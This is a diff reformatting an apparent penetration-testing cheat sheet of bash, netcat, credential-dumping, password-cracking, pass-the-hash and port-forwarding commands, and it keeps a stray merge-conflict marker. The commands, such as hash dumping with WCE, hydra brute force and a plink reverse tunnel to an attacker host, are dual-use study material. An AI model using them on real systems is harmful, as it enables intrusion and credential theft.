@@ -1,22 +1,29 @@
-#----- Bash -----#
+# ----- Bash ----- #
 
-## For loop
+### For loop
 for ip in $(cat file.txt); do echo $ip; done
 
-## Create directory structure for each IP in file.txt
+### Create directory structure for each IP in file.txt
 for ip in $(cat file.txt); do mkdir -p "$ip"/{penetration,notes,pillage,remote-enum,root-in-10-steps-or-less}; done
 
-## Parse file data
+### Parse file data
 cut -d'.' -f1 filename.txt |sort -u
 
-## Convert newline to comma
+### Convert newline to comma
 cat filename.txt | tr '\n' ,
 
-# Wordlist locations
+### Wordlist locations
 /usr/share 
 
+### Remove Space from file name
+for f in *\ *; do mv "$f" "${f// /_}"; done
 
-#----- Linux Commands -----#
+### BULK screenshots using ffmpeg
+for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg;done
+
+
+
+# ----- Linux Commands ----- #
 ### Process Running
 netstat -antp | grep sshd
 
@@ -28,7 +35,7 @@ update-rc.d ssh enable
 update-rc.d apache2 enable
 
 
-#----- NetCat -----#
+# ----- NetCat ----- #
 ### Connect using netcat
 nc -nv IPaddress port
 
@@ -48,14 +55,14 @@ nc -nvv -w 1 -z IPADDRESS START_PORT-END_PORT
 nc -unvv -w 1 -z IPADDRESS START_PORT-END_PORT
 
 
-#----- NCat (Supports encrypted tunnel) -----#
+# ----- NCat (Supports encrypted tunnel) ----- #
 ### Listener
 ncat -nlvp IPAddress 4444
 
 ### Connect
 ncat -v IPAddress 4444 --ssl
 
-#----- Google Hacking CMD -----#
+# ----- Google Hacking CMD ----- #
 ### Search specific site
 Site:"microsoft.com"
 
@@ -225,14 +232,14 @@ id
 cat /etc/shadow
 <<<<<<< HEAD
 
-#----- Password Dump -----# 
+# ----- Password Dump ----- # 
 ### Windows (they dump pass hashes from lsas process)
 pwdump and fgdump
 
 ### WCE (Windows Credential Editor Can steal ntml hashes from memory)
 wce64.exe -w	
 
-#----- Password Cracking -----# 
+# ----- Password Cracking ----- # 
 john hashes.txt
 
 ### To change password policy
@@ -248,7 +255,7 @@ ncrack -v -f --user admin -P password.txt rdp://IPADDRESS,CL=1
 hydra -l admin -P password.txt -v IPADRESS ftp
 
 
-#----- PASS-THE-HASH -----#
+# ----- PASS-THE-HASH ----- #
 ### https://www.hacklikeapornstar.com/all-pth-techniques/
 LM hash for empty password
 aad3b435b51404eeaad3b435b51404ee
@@ -260,11 +267,11 @@ export SMBHASH=aad3b435b51404eeaad3b435b51404ee:DUMPEDPASSEDhash
 
 pth-winexe -U administrator% //IPADDRESS cmd
 
-#----- PASSWORD CUSTOMIZING -----#
+# ----- PASSWORD CUSTOMIZING ----- #
 
 cewl www.website.com -m6 -w /output/path.txt
 
-#----- Findings -----#
+# ----- Findings ----- #
 
 Target Ip Address:
 Target Name:
@@ -276,7 +283,7 @@ Admin Accounts/Passwords:
 Other Accounts/Passwords:
 Misc Notes:
 
-#----- Port Forwarding -----#
+# ----- Port Forwarding ----- #
 
 /etc/rinetd.conf
 
@@ -287,7 +294,7 @@ plink -l root -pw password AttackerIP -R 3390:127.0.0.1:3389
 netstat -antp | grep LISTEN
 rdesktop 127.0.0.1:3390
 
-#----- MetaSploit -----#
+# ----- MetaSploit ----- #
 /etc/init.d/postgresql start
 /etc/init.d/metasploit start
 
